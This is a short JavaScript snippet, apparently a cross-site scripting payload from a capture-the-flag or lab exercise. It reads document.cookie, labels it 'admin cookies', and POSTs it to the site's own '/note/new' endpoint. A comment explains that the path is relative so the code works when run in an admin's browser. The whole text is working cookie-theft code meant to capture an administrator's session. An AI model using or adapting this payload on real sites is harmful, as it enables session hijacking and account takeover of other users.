const data = new FormData()
data.append("title", "admin cookies")
data.append("content", document.cookie)
data.append("submit", "save")

// The path needs to be relative because of the way the server handles the "admin"
fetch("/note/new", {
  method: "POST",
  body: data,
})
